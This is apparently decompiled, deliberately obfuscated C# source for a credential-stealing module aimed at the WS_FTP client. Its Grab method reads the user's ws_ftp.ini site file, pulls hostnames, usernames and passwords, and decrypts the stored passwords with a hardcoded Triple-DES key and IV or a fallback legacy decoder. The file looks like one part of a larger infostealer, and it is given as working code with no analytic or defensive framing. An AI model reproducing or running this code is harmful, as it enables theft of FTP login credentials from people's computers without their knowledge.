using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using _81d;
using p3N5Y;

namespace ZAZUx;

public class _2njIk : MnVCfk
{
	private static readonly byte[] _wsftpkey = new byte[24]
	{
		225, 240, 195, 210, 165, 180, 135, 150, 105, 120,
		75, 90, 45, 3, 15, 30, 52, 18, 120, 86,
		171, 144, 239, 205
	};

	private static readonly byte[] _iv = new byte[8] { 52, 18, 120, 86, 171, 144, 239, 205 };

	[CompilerGenerated]
	private string Application__BackingField;

	public string _7Bilk1Loa
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public _2njIk()
	{
		_7Bilk1Loa = "WS_FTP";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		string text = default;
		do
		{
			switch (num)
			{
			case 4:
				return new List<ii68>();
			case 1:
				list = new List<ii68>();
				num = 2;
				break;
			}
			if (num == 3)
			{
				if (File.Exists(text))
				{
					break;
				}
				num = 4;
			}
			if (num == 2)
			{
				text = Environment.GetEnvironmentVariable("appdata") + "Ipswitch\\WS_FTP\\Sites\\ws_ftp.ini";
				num = 3;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 5);
		kKdeGISe kKdeGISe2 = new kKdeGISe();
		kKdeGISe2.EKL3d(text);
		try
		{
			foreach (string key in kKdeGISe2.Keys)
			{
				ii68 ii69 = new ii68();
				foreach (string key2 in kKdeGISe2[key].Keys)
				{
					switch (key2)
					{
					case "HOST":
						ii69.byIdLuuGZbL = kKdeGISe2[key][key2].Trim(new char[1] { '\\' });
						break;
					case "UID":
						if (kKdeGISe2[key][key2] != null)
						{
							ii69.S8v = kKdeGISe2[key][key2].Trim(new char[1] { '\\' });
						}
						break;
					case "PWD":
						if (!string.IsNullOrEmpty(kKdeGISe2[key][key2]))
						{
							string text2 = xyDy6(kKdeGISe2[key][key2].Trim(new char[1] { '\\' }));
							if (text2 != null)
							{
								char[] trimChars = new char[1];
								ii69._9H5rP7hg2 = text2.Trim(trimChars);
							}
							else
							{
								ii69._9H5rP7hg2 = eC65OfZ(kKdeGISe2[key][key2]);
							}
						}
						break;
					}
				}
				ii69.oVAe = _7Bilk1Loa;
				if (!string.IsNullOrEmpty(ii69.S8v) && !string.IsNullOrEmpty(ii69._9H5rP7hg2))
				{
					list.Add(ii69);
				}
			}
		}
		catch
		{
		}
		return list;
	}

	private static string eC65OfZ(string AKWqD)
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		try
		{
			string text = AKWqD;
			if (!AKWqD.Contains("PWD="))
			{
				text = Convert.ToString("PWD=") + AKWqD;
			}
			string text2 = "";
			string text3 = text.Substring(37, text.Length - 37);
			for (int i = 0; (double)i <= (double)text3.Length / 2.0 - 1.0; i++)
			{
				string value = text3.Substring(i * 2, 2);
				string value2 = text.Substring(5 + i, 6 + i - (5 + i));
				int num2 = Convert.ToInt32(value, 16) - i - 1 - (47 + Convert.ToInt32(value2, 16)) % 57;
				text2 += (char)num2;
			}
			return text2;
		}
		catch
		{
			return "";
		}
	}

	private static string xyDy6(string cDY968)
	{
		int num = 0;
		string s = default;
		do
		{
			if (num == 2)
			{
				if (cDY968[0] != '_')
				{
					break;
				}
				num = 3;
			}
			if (num == 1)
			{
				s = cDY968;
				num = 2;
			}
			if (num == 3)
			{
				s = cDY968.Substring(1);
				num = 4;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 4);
		try
		{
			byte[] array = Convert.FromBase64String(s);
			TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
			tripleDESCryptoServiceProvider.Key = _wsftpkey;
			tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
			tripleDESCryptoServiceProvider.IV = _iv;
			tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
			TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider2 = tripleDESCryptoServiceProvider;
			ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider2.CreateDecryptor();
			byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
			return Encoding.UTF8.GetString(bytes);
		}
		catch
		{
			return null;
		}
	}
}
